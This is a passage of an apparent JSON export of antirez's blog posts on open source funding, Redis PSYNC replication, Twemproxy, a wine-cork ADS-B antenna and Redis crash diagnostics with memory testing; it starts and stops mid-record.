stimulated to get their changes incorporated.  Anyway, I'm much more happy with less patches merged and more freedom from the point of view of the user, than the reverse, so there is not much to argue for me.  In my opinion instead what the open source does not get back in a fair amount is money, not patches. The new startups movement, and the low costs of operations of many large IT companies, are based on the existence of so much open source code working well. Businesses should try to share a small fraction of the money they earn with the people that wrote the open source software that is a key factor for their success, and I think that a sane way to redistribute part of the money is by hiring those people to just write open source software (like VMware did with me), or to provide donations.  Many developers do a lot of work in their free time for passion, only a small percentage happens to be payed for their contribution to open source. Some redistribution may allow more people to focus on the code they write for passion and that possibly has a much *important effect* on the economy compared to what they do at work to get the salary every month. And unfortunately it is not possible to pay bills with pull requests, so why providing help to the project with source contributions is a good and sane thing to do, it is not enough in my opinion.  You can see all this from a different point of view, but what I see is that a lot of value in the current IT industry is provided by open source software, often written in the spare time, or with important efforts filling the time gaps between one thing and another thing you do in your work time, if your employer is kind enough to allow you to do so.  What I think is that this is economically suboptimal, a lot of smart coders could provide an economical boost if they could be more free to write what they love and what a lot of people are probably already using to make money. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-01-26T15:39:43Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 5004.4516967, "slug": "a-few-thoughts-about-open-source-software-91", "topics": []}}, {"model": "app.post", "pk": 92, "fields": {"title": "PSYNC", "link": "http://antirez.com/news/47", "source": 1, "normalized_link": "antirez.com/news/47", "summary": "Dear Redis users, in the final part of 2012 I repeated many time that the focus, for 2013, is all about Redis Cluster and Redis Sentinel.  This is exactly what I'm going to do from the point of view of the big picture, however there are many smaller features that make a big difference from the point of view of the Redis user day to day operations. Such features can't be ignored as well. They are less shiny in a feature list, and they are not good to generate buzz and interest in new users, and sometimes boring to code, but they are very important from a practical point of view.  So I ended the year and I'm starting the new one spending considerable time on a feature that was long awaited by many users having production instances crunching data every day, that is, the ability for a slave to partially resynchronize with the master without requiring a full resynchronization every time.  The good news is that finally today I've an implementation that works well in my tests. This means that this feature will be present in Redis 2.8, so it is the right time to start making users aware of it, and to describe how it works.  Some background ---  Redis replication is a pretty brutal piece of code in many ways:  1) It works by re-playing on slaves every command that was received in the Redis master that actually produced a change in the data set. 2) From the point of view of slaves, masters are just a bit special clients, but they are almost like normal clients sending commands. No special replication protocol or data format used for replication. 3) It *used to force* a full resynchronization every time a slave connects to a master. This means, at every connection, the slave will receive a copy of the master data set, in form of an RDB file, and load it.  Because of this characteristics Redis replication has been very reliable from the point of view of corruption. If you always full-resync, there are little chances for inconsistency. Also it was architecturally trivial, because masters are like clients, no special protocol is used and so forth.  Simple and reliable, what can go wrong? Well, what goes wrong is that sometimes even when simplicity is very important, to do an O(N) work when zero work is needed is not a good idea. I'm looking at you, point three of my list.  Consider the following scenario:  * Slave connect to master, and full resync. * Master and slave chat for one hour. * Slave disconnects from Master because of some silly network issue for 2 seconds.  A full resynchronization to reconnect is required. It was a design sacrifice because after all we are dealing with RAM-sized data sets. It can't be so hard. But actually as RAM gets cheaper, and big users more interested in Redis, we have many production instances with big data sets that need to full resync at every network issue.  Also resynchronization involves unpleasant things:  1) The disk is involved, since the slave saving the RDB file needs to write that file somewhere. 2) The master is forced to create an RDB file. Not a big deal as this master is supposed to save or write the AOF anyway, but still, more I/O without a good reason. 3) The slave needs to block at some point after reconnection in order to load the RDB file into memory.  This time it was the case to introduce complexity in order to make things better.  # So now Redis sucks as well?  MySQL is one of the first databases I get exposed for sure, a few decades ago, and the first time I had to setup replication I was shocked about how much it sucked. Are you serious that I need to enable binary logs and deal with offset?  Redis replication, that everyone agrees is dead-simple to setup, is more or less a response to how much I dislike MySQL replication from the point of view of the \"user interface\".  Even if we needed partial replicaton, I didn't wanted Redis to be like that. However to perform partial resynchronization you in some way or the other need something like that:   Hi Master! How are you? Remember that I used to be connected with you and we were such goooood friends?  Hey Slave! You still here piece of bastard...  Well, shut up and give me data starting from offset 282233943 before I signal you to the Authority Of The Lazy Databases.  Fu@**#$(*@($! ... 1010110010101001010100101 ...  So the obvious solution is to have a file in the master side with all the data so that when a slave wants to resync, we can provide any offset without problems just reading it from the file. Except that this sucks a lot: We became append-to-disk-bound even if AOF is disabled, need to deal with the file system that can get full, slow (Hey EC2!), and files to rotate one way or the other. Horrid.  So the following is a description about how Redis partial resynchronization implementation again accepts sacrifices to avoid to suck like that.  # Redis PSYNC  Redis partial resynchronization does two design sacrifices. It accepts that the slave will be able to resynchronize only if:  1) It reconnects in a reasonable amount of time. 2) The master was not restarted.  Because of this two relaxed requirements, instead of using a file, we can use a simple buffer inside our... Memory! Don't worry, a very acceptable amount of memory.  So a Redis master is modified in order to:  * Unify the data that is sent to the slave, so that every slave receives exactly the same things. We were about here already, but SELECT and PING commands were sent in a slave-specific fashion. Now instead the replication output to slaves is unified. * Take a backlog of what we send to slaves. So for instance we take 10 MB of past data. * Take a replication global offset, that the user never needs to deal with. We simply provide this offset to the slave, that will increment it every time it receives data. This way the slave is able to ask for partial resynchronization indicating the offset to start with.  Oh also, we don't want the system to be fragile, so we use the master \"run id\", that is a concept that was introduced in Redis in the past as an unique identifier of a given instance execution. When the slave synchronizes with the master, it also gets the master run id, so that a next partial resynchronization attempt will be made only if the master is the same, as in, the exact same execution of Redis.  Also the PSYNC command was introduced as a variant of SYNC for partially resync capable instances.  # How all this works in practice?  When the slave gets disconnected, you'll see something like this:  [60051] 17 Jan 16:52:54.979 * Caching the disconnected master state. [60051] 17 Jan 16:52:55.405 * Connecting to MASTER... [60051] 17 Jan 16:52:55.405 * MASTER  SLAVE sync started [60051] 17 Jan 16:52:55.405 * Non blocking connect for SYNC fired the event. [60051] 17 Jan 16:52:55.405 * Master replied to PING, replication can continue... [60051] 17 Jan 16:52:55.405 * Trying a partial resynchronization (request 6f0d582d3a23b65515644d7c61a10bf9b28094ca:30). [60051] 17 Jan 16:52:55.406 * Successful partial resynchronization with master. [60051] 17 Jan 16:52:55.406 * MASTER  SLAVE sync: Master accepted a Partial Resynchronization.  See the first line, the slave *caches* the master client structure, so that all the buffers are saved to be reused if we'll be able to resynchronize.  In the master side we'll see instead:  [59968] 17 Jan 16:52:55.406 * Slave asks for synchronization [59968] 17 Jan 16:52:55.406 * Partial resynchronization request accepted. Sending 0 bytes of backlog starting from offset 30.  So basically, as long as the data is still available as no more than N bytes worth of Redis protocol (of write commands) was sent to the master, the slave will be still able to reconnect. Otherwise a full resynchronization will be performed. How much backlog to allocate is up to the user.  # Current status  The 'psync' branch on my private repository now seems to work very well, however this is Very Important Code and must be tested a lot. This is what I'm doing right now. When I'm considerably sure the code is solid, I'll merge into unstable and 2.8 branch. When it runs for weeks without issues and starts to be adopted by the brave early adopters, we'll release 2.8 with this and other new features. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2013-01-16T15:39:22Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 4985.25123, "slug": "psync-92", "topics": []}}, {"model": "app.post", "pk": 93, "fields": {"title": "ADS-B wine cork antenna", "link": "http://antirez.com/news/46", "source": 1, "normalized_link": "antirez.com/news/46", "summary": "# Software defined radio is cool  About one week ago I received my RTLSDR dongle, entering the already copious crew of software defined radio enthusiasts.  It's really a lot of fun, for instance from my home that is at about 10 km from the Catania Airport I can listen the tower talking with the aircrafts in the 118.700 Mhz frequency with AM modulation, however because of lack of time I was not able to explore this further until the past Sunday.  My Sunday goal was to use the RTLSDR to see if I was able to capture some ADS-B message from the aircrafts lading or leaving from the airport. Basically ADS-B is a security device that is installed in most aircrafts that is used for collision avoidance and other stuff like this. Every aircraft broadcasts informations about heading, speed, altitude and so forth.  With software defined radio there are a lot of programs in order to demodulate this information (that is encoded in a fairly simple to decode format). I use \"modes_rx\" that is free software, just Google for it.  However this transmissions happen in the 1090 Mhz frequency. My toy antenna nor other rabbit ears antennas I had at home worked at all for this frequency, so I read a few things on Google and tried a simple design that actually works well and takes 10 minutes to build using just a bit of wire and a wine cork.  # Cork wine dipole antenna  Sorry but I know almost nothing about antennas. However I'll try to provide you the informations I've about the theoretical aspects of this antenna.  Technically speaking this antenna is an Half Wavelength Dipole. In practical terms it is two pieces aligned parallel wires with a small space between them, with a total length that is half the wavelength of the frequency I want to listen to.  Speed of light = 300 000 000 meters per second Frequency I want to listen to = 1090 Mhz, that is, 1090 000 000 Hertz Wavelength at frequency = 300 000 000 / 1090 000 000 = 275 millimeters.  The half of 275 millimeters is 137 millimeters more or less, so this is the length of our antenna:  img://antirez.com/misc/1090_antenna_1.jpg  Now you can ask, why half the wavelength? But even for a n00b like me this actually makes a lot of sense, look at this:  img://antirez.com/misc/1090_antenna_4.jpg  Basically if you imagine a sinusoidal wave,  when one of the two pieces of the antenna is invested by the *high* part of the wave, the other is in the *low* side, and I guess that for induction this creates the current.  Ok, end of broscience for today.  # How to build it  Simply take two pieces of wire of 10 centimeters each, and insert then into the cork. Then blend the two wires to emulate the design in the picture trying to make the space between the two wires small enough. Finally cut the two wires so that they are more or less the same length, and for a total of 137 millimeters.  In the other side of the cork I connected my two wires that go to the RTLSDR. I'm so lazy that I not even soldered the wires... You probably should!  img://antirez.com/misc/1090_antenna_2.jpg  Finally the two connected wires go to a PAL-style connector like this:  img://antirez.com/misc/1090_antenna_3.jpg  That in turn is connected with an adapter for the much smaller connector in the RTLSDR USB dongle. Even with all this interruptions along the path I can receive many aircrafts like a boss, even from indoor, like this:  (-51 0.0000000000) Type 17 BDS0,9-1 (track report) from 3c6313 with velocity 299kt heading 129 VS -320 (-49 0.0000000000) Type 17 BDS0,5 (position report) from 3c6313 at (37.500388, 15.005891) at 9300ft (-51 0.0000000000) Type 11 (all call reply) from 3c6313 in reply to interrogator 0 with capability level 6 (-51 0.0000000000) Type 17 BDS0,9-1 (track report) from 3c6313 with velocity 298kt heading 129 VS -320 (-51 0.0000000000) Type 17 BDS0,5 (position report) from 3c6313 at (37.499863, 15.006681) at 9300ft  ... And so forth.  Have fun! And if you have tricks to make the antenna better while retaining the simplicity, please let me know. Comments", "content": "", "cover_photo_url": "http://antirez.com/misc/1090_antenna_1.jpg", "profile": 4, "updated_on": "2012-12-16T15:38:36Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 4925.7302078, "slug": "ads-b-wine-cork-antenna-93", "topics": []}}, {"model": "app.post", "pk": 94, "fields": {"title": "Partial resyncs and synchronous replication.", "link": "http://antirez.com/news/45", "source": 1, "normalized_link": "antirez.com/news/45", "summary": "Currently I'm working on Redis partial resynchronization of slaves as I wrote in previous blog posts.  The idea is that we have a backlog of the replication stream, up to the specified amount of bytes (this will be in the order of a few megabytes by default).  If a slave lost the connection, it connects again, see if the master RUNID is the same, and asks to continue from a given offset. If this is possible, we continue, nothing is lost, and a full resynchronization is not needed. Otherwise if the offset is about data we no longer have in the backlog, we full resync.  Now what's interesting about this is that, in order to make this possible, both the slave and the master know about a global offset that is the replication offset, since the master was ever started.  Now, if we provide a command that returns this offset, it is simple for a client to simulate synchronous replication in Redis just sending the query, asking for the offset (think about MULTI/EXEC to do that) and then asking the same to the slave. Because Redis replication is very low latency, the client can simply do an optimistic \"write, read-offset, read-offset-on-slave\" and likely the offset we read on the slave will already be ok to continue (or, we can read it again with some pause).  This is already something that could be useful, but I wonder if we could build something even better starting from that, that is, a way to send Redis a command that blocks as long as the current replication offset was not acknowledged from at least N connected slaves, and returns when this happened with +OK.  I'm not promising that this will be available as we need to understand how useful is this and the complexity, but from an initial analysis this could be trivial to implement fast and reliably... and sounds pretty good.  More news ASAP. Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2012-12-11T15:38:03Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 4916.1294744, "slug": "partial-resyncs-and-synchronous-replication-94", "topics": []}}, {"model": "app.post", "pk": 95, "fields": {"title": "Twemproxy, a Redis proxy from Twitter", "link": "http://antirez.com/news/44", "source": 1, "normalized_link": "antirez.com/news/44", "summary": "While a big number of users use large farms of Redis nodes, from the point of view of the project itself currently Redis is a mostly single-instance business.  I've big plans about going distributed with the project, to the extent that I'm no longer evaluating any threaded version of Redis: for me from the point of view of Redis a core is like a computer, so that scaling multi core or on a cluster of computers is the same conceptually. Multiple instances is a share-nothing architecture. Everything makes sense AS LONG AS we have a *credible way* to shard :-)  This is why Redis Cluster will be the main focus of 2013 for Redis, and finally, now that Redis 2.6 is out and is showing to be pretty stable and mature, it is the right moment to focus on Redis Cluster, Redis Sentinel, and other long awaited improvements in the area of replication (partial resynchronization).  However the reality is that Redis Cluster is not yet production ready and requires months of work. Still our users already need to shard data on multiple instances in order to distribute the load, and especially in order to use many computers to get a big amount of RAM ready for data.  The sole option so far was client side sharding. Client side sharding has advantages as there are no intermediate layers between clients and nodes, nor routing of request, so it is a very scalable setup (linearly scalable, basically). However to implement it reliably requires some tuning, a way to take clients configuration in sync, and the availability of a solid client with consistent hashing support or some other partitioning algorithm.  Apparently there is a big news in the landscape, and has something to do with Twitter, where one of the biggest Redis farms deployed happen to serve timelines to users. So it comes as no surprise that the project I'm talking about in this blog post comes from the Twitter Open Source division.  Twemproxy ---  Twemproxy is a fast single-threaded proxy supporting the Memcached ASCII protocol and more recently the Redis protocol:  https://github.com/twitter/twemproxy  It is written entirely in C and is licensed under the Apache 2.0 License. The project works on Linux and AFAIK can't be compiled on OSX because it relies on the epoll API.  I did my tests using my Ubuntu 12.04 desktop.  But well, I'm still not saying anything useful. What twemproxy does actually? (Note: I'll focus on the Redis part, but the project is also able to do the same things for memcached as well).  1) It works as a proxy between your clients and many Redis instances. 2) It is able to automatically shard data among the configured Redis instances. 3) It supports consistent hashing with different strategies and hashing functions.  What's awesome about Twemproxy is that it can be configured both to disable nodes on failure, and retry after some time, or to stick to the specified keys -> servers map. This means that it is suitable both for sharding a Redis data set when Redis is used as a data store (disabling the node ejection), and when Redis is using as a cache, enabling node-ejection for cheap (as in simple, not as in bad quality) high availability.  The bottom line here is: if you enable node-ejection your data may end into other nodes when a node fails, so there is no guarantee about consistency. On the other side if you disable node-ejection you need to have a per-instance high availability setup, for example using automatic failover via Redis Sentinel.   Installation ---  Before diving more inside the project features, I've good news, it is trivial to build on Linux. Well, not as trivial as Redis, but\u2026 you just need to follow those simple steps:  apt-get install automake apt-get install libtool git clone git://github.com/twitter/twemproxy.git cd twemproxy autoreconf -fvi ./configure --enable-debug=log make src/nutcracker -h  It is pretty trivial to configure as well, and there is sufficient documentation in the project github page to have a smooth first experience. For instance I used the following configuration:  redis1:   listen: 0.0.0.0:9999   redis: true   hash: fnv1a_64   distribution: ketama   auto_eject_hosts: true   timeout: 400   server_retry_timeout: 2000   server_failure_limit: 1   servers:    - 127.0.0.1:6379:1    - 127.0.0.1:6380:1    - 127.0.0.1:6381:1    - 127.0.0.1:6382:1  redis2:   listen: 0.0.0.0:10000   redis: true   hash: fnv1a_64   distribution: ketama   auto_eject_hosts: false   timeout: 400   servers:    - 127.0.0.1:6379:1    - 127.0.0.1:6380:1    - 127.0.0.1:6381:1    - 127.0.0.1:6382:1  Basically the first cluster is configured with node ejection, and the second as a static map among the configured instances.  What is great is that you can have multiple setups at the same time possibly involving the same hosts. However for production I find more appropriate to use multiple instances to use multiple cores.  Single point of failure? ---  Another very interesting thing is that, actually, using this setup does not mean you have a single point of failure, since you can run multiple instances of twemproxy and let your client connect to the first available.  Basically what you are doing with twemproxy is to separate the sharding logic from your client. At this point a basic client will do the trick, sharding will be handled by the proxy.  It is a straightforward but safe approach to partitioning IMHO.  Currently that Redis Cluster is not available, I would say, it is the way to go for most users that want a cluster of Redis instances today. But read about the limitations before to get too excited ;)  Limitations ---  I think that twemproxy do it right, not supporting multiple keys commands nor transactions. Currently is AFAIK even more strict than Redis Cluster that instead allows MULTI/EXEC blocks if all the commands are about the same key.  But IMHO it's the way to go, distribute the subset you can distribute efficiently, and pose this as a design challenge early to the user, instead to invest a big amount of resources into \"just works\" implementations that try to aggregate data from multiple instances, but that will hardly be fast enough once you start to have serious loads because of too big constant times to move data around.  However there is some support for commands with multiple keys. MGET and DEL are handled correctly. Interestingly MGET will split the request among different servers and will return the reply as a single entity. This is pretty cool even if I don't get the right performance numbers with this feature (see later).  Anyway the fact that multi-key commands and transactions are not supported it means that twemproxy is not for everybody, exactly like Redis Cluster itself. Especially since apparently EVAL is not supported (I think they should support it! It's trivial, EVAL is designed to work in a proxy like that because key names are explicit).  Things that could be improved ---  Error reporting is not always stellar. Sending a non supported command closes the connection. Similarly sending just a \"GET\" from redis-cli does not report any error about bad number of arguments but hangs the connection forever.  However other errors from the server are passed to the client correctly:  redis metal:10000> get list (error) WRONGTYPE Operation against a key holding the wrong kind of value  Another thing that I would love to see is support for automatic failover. There are many alternatives:  1) twemproxy is already able to monitor instance errors, count the number of errors, and eject the node when enough errors are detected. Well it is a shame it is not able to take slave nodes as alternatives, and instead of eject nodes use the alternate nodes just after sending a SLAVE OF NOONE command. This would turn it into an HA solution as well.  2) Or alternatively, I would love if it could be able to work in tandem with Redis Sentinel, checking the Sentinel configuration regularly to upgrade the servers table if a failover happened.  3) Another alternative is to provide a way to hot-configure twemproxy so that on fail overs Sentinel could switch the configuration of the proxy ASAP.  There are many alternatives, but basically, some support for HA could be great.  Performances ---  This Thing Is Fast. Really fast, it is almost as fast as talking directly with Redis. I would say you lose 20% of performances at worst.  My only issue with performances is that IMHO MGET could use some improvement when the command is distributed among instances.  After all if the proxy has similar latency between it and all the Redis instances (very likely), if the MGETs are sent at the same time, likely the replies will reach the proxy about at the same time. So I expected to see almost the same numbers with an MGET as I see when I run the MGET against a single instance, but I get only 50% of the operations per second. Maybe it's the time to reconstruct the reply, I'm not sure.  Conclusions ---  It is a great project, and since Redis Cluster is yet not here, I strongly suggest Redis users to give it a try.  Personally I'm going to link it in some visible place in the Redis project site. I think the Twitter guys here provided some real value to Redis itself with their project, so\u2026  Kudos! Comments", "content": "", "cover_photo_url": "http://antirez.com/images/favicon.png", "profile": 4, "updated_on": "2012-12-03T15:37:42Z", "upvotes_count": 1, "aggregate_votes_count": 1, "comments_count": 0, "score": 4900.7690078, "slug": "twemproxy-a-redis-proxy-from-twitter-95", "topics": []}}, {"model": "app.post", "pk": 96, "fields": {"title": "Redis Crashes", "link": "http://antirez.com/news/43", "source": 1, "normalized_link": "antirez.com/news/43", "summary": "Premise: a small rant about software reliability. ===  I'm very serious about software reliability, and this is not just a good thing. It is good in a sense, as I tend to work to ensure that the software I release is solid. At the same time I think I take this issue a bit too personally: I get upset if I receive a crash report that I can't investigate further for some reason, or that looks like almost impossible to me, or with an unhelpful stack trace.  Guess what? This is a bad attitude because to deliver bugs free software is simply impossible. We are used to think in terms of labels: \"stable\", \"production ready\", \"beta quality\". I think that these labels are actually pretty misleading if not put in the right perspective.  Software reliability is an incredibly complex mix of ingredients.  1) Precision of the specification or documentation itself. If you don't know how the software is supposed to behave, you have things that may be bugs or features. It depends on the point of view. 2) Amount of things not working accordingly to the specification, or causing a software crash. Let's call these just software \"errors\". 3) Percentage of errors that happen to be in the subset of the software that is actually used and stressed by most users. 4) Probability that the conditions needed for a given error to happen are met.  So what happens is that you code something, and this initial version will be as good as good and meticulous are you as a programmer, or as good is your team and organization if it is a larger software project involving many developers. But this initial version contains a number of errors anyway.  Then you and your users test, or simply use, this new code. All the errors that are likely to happen and to be recognized, because they live in the subset of the code that users hit the most, start to be discovered. Initially you discover a lot of issues in a short time, then every new bug takes more time to be found, probabilistically speaking, as it starts to be in the part of the code that is less stressed, or the conditions to make the error evident are unlikely to be met.  Basically your code is never free from errors. \"alpha\", \"beta\", \"production read\", and \"rock solid\" are just names we assign to the probability we believe there is for a serious error to be discovered in a reasonable time frame.  Redis crashes ===  Redis users are not likely to see Redis crashing without a good reason (Redis will abort on purpose in a few exceptional conditions). However from time to time there are bugs in Redis that will caused a server crash under certain conditions.  What makes crashes different from other errors is that in complex systems crashes are the perfect kind of \"likely hard to reproduce error\". Bug fixing is all about creating a mental model of how the software works to understand why it is not behaving as expected. Every time you can trigger the bug again, you add information to your model: eventually you have enough informations to understand and fix the bug.  Crashes on Redis are crashes happening on a long running program, that interacts with many clients that are sending command at different times, in a way that the sequence of commands and events is very hard to reproduce.  Crashes stop the server, provide little clues, and are usually very hard to reproduce. This means little information, poor model of what is happening, and ultimately, very hard to fix bugs.  If this is not enough, crashes are not only bad for developers, they are also very bad for users, as the software stops working after a crash, that is one of the biggest misbehaviors you can expect from a software.  This is why I hate Redis (and other software) crashes.  Stack traces ===  Are there ways to make crashes more *friendly*?  If a crash is reproducible, and if the user has time to spent with you, possibly from a far away time zone, maybe you can make a crash more friendly with a debugger. If you are lucky enough that data is not important for the user, you may also get a core dump (that contains a copy of the data set in the case of Redis).  However most of the crashes will simply not happen again in a practical amount of time, or the user can't help debugging, or data is too important to send you a core. So one of the first things I did to improve Redis crashes was to make it print a stack trace when it crashes.  This is an example of what you get if you send DEBUG SEGFAULT to the server:  EDIS BUG REPORT START: Cut & paste starting from here === [32827] 26 Nov 15:19:14.158 #     Redis 2.6.4 crashed by signal: 11 [32827] 26 Nov 15:19:14.158 #     Failed assertion:  (:0) [32827] 26 Nov 15:19:14.158 # --- STACK TRACE 0   redis-server                        0x0000000103a15208 logStackTrace + 88 1   redis-server                        0x0000000103a16544 debugCommand + 68 2   libsystem_c.dylib                   0x00007fff8c5698ea _sigtramp + 26 3   ???                                 0x0000000000000000 0x0 + 0 4   redis-server                        0x00000001039ec145 call + 165 5   redis-server                        0x00000001039ec77f processCommand + 895 6   redis-server                        0x00000001039f7fd0 processInputBuffer + 160 7   redis-server                        0x00000001039f6dfc readQueryFromClient + 396 8   redis-server                        0x00000001039e82d3 aeProcessEvents + 643 9   redis-server                        0x00000001039e851b aeMain + 59 10  redis-server                        0x00000001039ef33e main + 1006 11  libdyld.dylib                       0x00007fff91ef97e1 start + 0 12  ???                                 0x0000000000000001 0x0 + 1  ... more stuff ...  [32827] 26 Nov 15:19:14.163 # --- CURRENT CLIENT INFO [32827] 26 Nov 15:19:14.163 # client: addr=127.0.0.1:56888 fd=5 age=0 idle=0 flags=N db=0 sub=0 psub=0 multi=-1 qbuf=0 qbuf-free=32768 obl=0 oll=0 omem=0 events=r cmd=debug [32827] 26 Nov 15:19:14.163 # argv[0]: 'debug' [32827] 26 Nov 15:19:14.163 # argv[1]: 'segfault' [32827] 26 Nov 15:19:14.163 # --- REGISTERS [32827] 26 Nov 15:19:14.163 #  RAX:0000000000000000 RBX:00007fb8e4800000 RCX:00000000000003e8 RDX:00007fff79804788 RDI:0000000000000000 RSI:0000000103a4e2bf RBP:00007fff5c2194c0 RSP:00007fff5c2193e0 R8 :0000000050b37a62 R9 :0000000000000019 R10:0000000000000001 R11:0000000002000000 R12:0000000000026c0f R13:0000000103a6bc80 R14:00007fb8e3600000 R15:00007fb8e3600178 RIP:0000000103a16544 EFL:0000000000010246 CS :000000000000002b FS:0000000000000000  GS:0000000000000000 [32827] 26 Nov 15:19:14.164 # (00007fff5c219458) -> 00007fb8e3600000 [32827] 26 Nov 15:19:14.164 # (00007fff5c219450) -> 0000000000000001 [32827] 26 Nov 15:19:14.164 # (00007fff5c219448) -> 0000000000000000 [32827] 26 Nov 15:19:14.164 # (00007fff5c219440) -> 00007fff5c219470  ... more stuff ...  And a lot more, including the INFO output and the full list of connected clients and their state.  Printing stack traces on crash is already a huge improvement over \"segmentation fault, core dumped\". A lot of times I can fix the issue just from the output I see, without asking anything to the user. Add to this that we have the arguments of the currently executed command.  I'm crazy enough that Redis logs registers and part of the stack as well. If you have this trace, and a copy of the redis-server executable that caused it (and users will send it to you easily), you can inspect a lot of state just from that.  EVERY MISSION CRITICAL SOFTWARE should do this.  Broken memory ===  So far so good. That kind of reporting on crashes, plus a gentle and helpful community of users, can help you improve the quality of the software you ship, a lot. But what happens if the bug is an hard one? A memory violation in a random place like a dictionary lookup in the context of a simple GET operation? Well, you are in big troubles. You can't ignore a bug like that, but inspecting it take a lot of time.  And guess what? Many times you do a lot of work for nothing, as Redis crashes only because the user was using broken memory.  Think along these lines: Redis uses memory a lot, and memory errors will easily amplify when you use a lot of data structures with pointers. If there is a broken bit it will easily end crashing the server in a short time.  Now let's scale this to the sum of all the memory that every single Redis instance out there is using right now. What you get is that Redis is like a parallel memory test working on many computers, waiting to spot some bit error. And as Redis gets more known and deployed? More memory tested every second.  The problem is that this giant memory test will not write \"Hey, you got a problem in your memory!\". The output will be a new issue in the Redis GitHub issue system, and me investigating non existing issues for hours.  First countermeasure ===  At some point, after the first endless investigations, I started to be smarter: when a bug looked suspicious I started the investigation with \"Please, can you run a memory test to verify the computer memory and CPU are likely ok?\".  However this requires the user to reboot the machine and run memtest86. Or at least to install some user space memory testing program like memtester available in most Linux distributions. Many times the user has no physical access at all to the box, or there is no \"box\" at all, the user is using a virtual machine somewhere.  After some time I realized that if Redis could be able to test the computer memory easily without requiring additional software, I would be able to receive more memory test reports from users.  This is why recent Redis instance can perform a memory test if you write something like that:  ./redis-server --test-memory 4096  Where \"4096\" is the number of megabytes of RAM to test.  The test is not perfect but it showed to be pretty effective to detect normal memory errors, however there are more subtle errors like retention errors that happen if you set some memory cell to a given value, and wait some time, and then retry to read it, that are not detected by this test. But well, apparently most memory errors are simpler than that and can be more easily detected.  The quality of the detection also depends on the amount of time the user will let the memory test to run. There are errors that just happen rarely.  Anyway this test improved my experience with Redis crashes a lot. Sometimes I see a bug report, I just ask the user to test the RAM, and I get a message where the user acknowledges that there was a problem with a memory module.  However users rarely run a more accurate memory test like memtest86 for days, like they should after a crash. Many times it is simply not practical at all. So even when I get a \"memory is fine\" report I simply accept it as a matter of facts that memory is ok and I investigate the issue closely, but, if I never saw a crash like this reported at least one more time in recent times with different hardware, and there is no way to reproduce such a crash, after some efforts I'll simply stop investigating, taking the issue open for some more time, and finally closing it if no other similar crashes are reported.  Testing more memory ===  Even not considering that there are false negatives, with the current redis-server --test-memory approach there are two bigger problems.  1) Not every user will actually run the test after a crash. 2) Users running Redis using virtualization, possibly using a virtual machine provider like EC2, will never know if they are testing the same phyisical memory pages when they run redis-server --test-memory.  The first problem could be addressed simply using a policy: a crash without a memory test is not investigated if it looks suspicious. However this is not good for the Redis project nor for the users: sometimes an user will file a report and will simply have no more time to help us. Some other time it can't stop the server. And we developers may miss the opportunity to track a bug just because of a bad attitude and the possibility of a memory error.  The second problem, related to people using virtualization, is even worse. Even when users want to help you, then can't in a reliable way.  So what about testing memory just when a crash happens? This would allow Redis to test the memory of every single computer where a crash has happened. The bug report will be annotated with the result of the test, providing an interesting hint about the state of the memory without further help from the user.  And even better, the test will test exactly the memory as allocated at the moment of the crash! It will test exactly the physical memory pages that Redis is using, that is just perfect for environments like EC2.  The problem is, how to do it?  How to test on crashes ===  My first idea was to test memory incrementally inside the allocator. Like, from time to time, if you allocate some memory, run a fast memory test on it and log it on the Redis log and in the INFO output if a problem was detected.  In theory it is nice, and I even implemented the idea. The problem is, it is completely unreliable. If the broken memory is allocated for something that is never deallocated later, it will never be tested again. Worse than that, it takes a lot of time to test the whole memory incrementally small piece after small piece, and what about testing every single location? The allocator itself uses \"internal\" memory that is never exposed to the user, and we are missing all these pages.  Bad idea... and... the implementation I wrote was not working at all as the CPU cache made it completely useless, as testing small pieces of memory incrementally results in a constant cache hit.  The second try was definitely better, and was simply to test the whole space of allocated memory, but only when a crash happens.  At first this looks pretty hard: at least you need to get a lot more help from the memory allocator you are using. I don't think jemalloc has an out of the box way to report the memory regions allocated so far. Also if we are crashing, I'm not sure how reliable asking the allocator to report memory regions could be. As a result of a single bit error, it is very easy to see the error propagating at random locations.  There are other problems. After a crash we want to be able to dump a core that is meaningful. If during the memory test we fill our memory with patterns, the core file will be completely useless. This means that the memory test needed to be conceived so that at the end of the test the memory was left untouched.  The proc filesystem /proc//maps ===  The Linux implementation of the proc filesystem makes Linux an exceptionally introspective operating system. A developer needs minimal efforts to be able to access informations that are usually non exposed to the user space. Actually the effort required is so small as to parse a text file.  The \"maps\" file of the proc filesystem shows line after line all the memory mapped regions for a given process and their permissions (read, write, execute). The sum of all the reported regions is the whole address space that can be accessed in some way by the specified process.  Some of this maps are \"special\" maps created by the kernel itself, like the process stack. Other maps are memory mapped files like dynamic libraries, and others are simply regions of memory allocated by malloc(), either using the sbrk() syscall or an anonymous mmap().  The following two lines are examples of maps (obtained with \"cat /proc/self/maps)  7fb1b699b000-7fb1b6b4e000 r-xp 00000000 08:05 15735004                   /lib/x86_64-linux-gnu/libc-2.15.so 7fb1b6f5f000-7fb1b6f62000 rw-p 00000000 00:00 0  The first part of each line is the address range of the memory mapped area, followed by permissions \"rwxp\" (read, write, execute, private), the second is the offset in case of a memory mapped file, then there is the device id, that is 00:00 for anonymous maps, and finally the inode and file name for memory mapped files.  We are interested to check all the heap allocated memory that is readable and writable, so a simple grep will do the trick:  $ cat /proc/self/maps | grep 00:00 | grep rw  01cbb000-01cdc000 rw-p 00000000 00:00 0                                  [heap] 7f46859f9000-7f46859fe000 rw-p 00000000 00:00 0  7f4685c05000-7f4685c08000 rw-p 00000000 00:00 0  7f4685c1e000-7f4685c20000 rw-p 00000000 00:00 0  7fffe7048000-7fffe7069000 rw-p 00000000 00:00 0                          [stack]  Here we can find both the heap allocated using the setbrk() system call, and the heap allocated using anonymous maps. However there is one thing that we don't want to scan, that is the stack, otherwise the function that is testing the memory itself would easily crash.  So thanks to the Linux proc filessystem the first problem is no longer a big issue, and we use some code like this:  int memtest_test_linux_anonymous_maps(void) {     FILE *fp = fopen(\"/proc/self/maps\",\"r\");      ... some more var declaration ...      while(fgets(line,sizeof(line),fp) != NULL) {         char *start, *end, *p = line;          start = p;         p = strchr(p,'-');         if (!p) 